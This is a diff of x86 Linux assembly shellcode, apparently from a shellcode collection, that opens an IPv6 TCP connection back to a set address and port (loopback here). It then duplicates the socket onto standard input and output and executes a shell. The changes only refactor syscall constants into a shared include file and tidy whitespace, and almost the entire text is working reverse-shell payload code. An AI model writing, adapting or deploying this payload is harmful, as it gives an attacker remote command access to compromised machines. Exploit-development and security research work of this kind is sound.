@@ -3,16 +3,11 @@
 	;; x86/Linux shellcode
 	;; IPv6/TCP connect back to [::1]:4096
 	;; 134 bytes
-	
+
 section .text
 global _start
 
-%define SOCKETCALL 	102
-%define EXECV		11
-%define DUP2		63	
-	
-%define SYS_SOCKET 	1
-%define SYS_CONNECT	3
+    %include "../../../utils_linux_x86.asm"
 
 %define AF_INET6	10
 %define SOCK_STREAM	1
@@ -22,9 +17,9 @@ global _start
 %define IP1		0x00000000
 %define IP2		0x00000000
 %define IP3		0x00000000
-	
+
 %define PORT		0x0010		; htons(4096)
-	
+
 _start:
 .SOCKET:
 	push IPPROTO_TCP
@@ -34,39 +29,39 @@ _start:
 	xor ebx, ebx
 	xor eax, eax
 	mov ecx, esp
-	mov bl, SYS_SOCKET
-	mov al, SOCKETCALL
+	mov bl, SOCK_SOCKET
+	mov al, SYS_SOCKETCALL
 	int 0x80
 
 	mov esi, eax
-	
+
 .CONNECT:
 	xor eax, eax		; scope_id
 	push eax
-	
+
 	mov eax, ~IP0		; sin6_addr
 	not eax
 	push eax
-	
+
 	mov eax, ~IP1
 	not eax
 	push eax
-	
+
 	mov eax, ~IP2
 	not eax
 	push eax
-	
+
 	mov eax, ~IP3
 	not eax
 	push eax
 
 	xor eax, eax		; flow_info
 	push eax
-	
+
 	mov ax, ~PORT		; sin6_port
 	not ax
 	push word ax
-	
+
 	push word AF_INET6	; sin6_family
 	mov eax, esp
 
@@ -76,23 +71,23 @@ _start:
 
 	mov ecx, esp
 	xor ebx, ebx
-	mov bl, SYS_CONNECT
+	mov bl, SOCK_CONNECT
 	xor eax, eax
-	mov al, SOCKETCALL
+	mov al, SYS_SOCKETCALL
 	int 0x80
-		
+
 .DUP2:
 	xor ecx, ecx
 	mov ebx, esi
 	xor eax, eax
-	mov al, DUP2
+	mov al, SYS_DUP2
 	int 0x80
 
 	mov ebx, esi
 	xor ecx, ecx
 	inc ecx
 	xor eax, eax
-	mov al, DUP2
+	mov al, SYS_DUP2
 	int 0x80
 
 .EXECV:
@@ -107,5 +102,5 @@ _start:
 
 	xor edx, edx
 	mov ecx, esp
-	mov al, EXECV
+	mov al, SYS_EXECV
 	int 0x80
